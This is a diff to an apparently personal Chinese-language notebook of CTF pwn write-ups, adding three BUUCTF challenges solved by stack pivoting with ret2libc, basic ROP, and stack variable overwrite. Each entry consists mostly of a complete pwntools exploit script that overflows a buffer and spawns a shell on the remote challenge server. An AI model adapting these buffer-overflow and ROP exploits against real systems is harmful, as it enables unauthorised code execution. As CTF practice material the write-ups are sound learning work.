@@ -156,3 +156,93 @@ p.interactive()
     ```
 
     这四个寄存器地址也确实可以搜到，所以根据寄存器依次输入需要的数就好
+
+## 48 [Black Watch 入群题]PWN
+
+***栈迁移+ret2libc***
+
+因为没有RWX段，所以不可以写入shellcode然后栈迁移执行
+
+```python
+from pwn import *
+
+#p = process('./pwn')
+p = remote("node5.buuoj.cn", 25707)
+elf = ELF('./pwn')
+libc = ELF('./libc-2.23.so')
+
+main_addr = 0x8048513
+lea_ret_addr = 0x8048511
+plt_write = elf.plt['write']
+got_write = elf.got['write']
+bss_s_addr = 0x804A300
+
+payload1 = b'a' * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(got_write) + p32(4)
+p.sendafter("name?", payload1)
+
+payload2 = b'a' * 0x18 + p32(bss_s_addr) + p32(lea_ret_addr)
+p.sendafter("say?", payload2)
+write_addr = u32(p.recv(4))
+
+offset = write_addr - libc.symbols['write']
+binsh = offset + libc.search('/bin/sh').__next__()
+system = offset + libc.symbols['system']
+
+payload3 = b'aaaa' + p32(system) + b'aaaa' + p32(binsh)
+p.sendafter("name?", payload3)
+
+p.sendafter("say?", payload2)
+p.interactive()
+```
+
+
+
+## 49 wustctf2020_getshell_2
+
+***基础ROP***
+
+system(/sh)也可以getshell
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+
+elf = ELF("./pwn")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',28502)
+
+
+sh = 0x08048670
+call_sys = 0x8048529
+
+payload = b'b'*0x18+b'b'*0x4+p32(call_sys)+p32(sh)
+p.recvuntil(b'\n')
+p.sendline(payload)
+p.interactive()
+```
+
+## 50 mrctf2020_easyoverflow
+
+***栈数据覆盖***
+
+发现当`check(v5)`等于`n0t_r3@11y_f1@g`时会getshell，然后`v4`的读入不限制长度，可以覆盖掉v5的值
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',29336)
+payload = b'b'*0x30+b'n0t_r3@11y_f1@g'
+p.sendline(payload)
+p.interactive()
+```
+
+
+
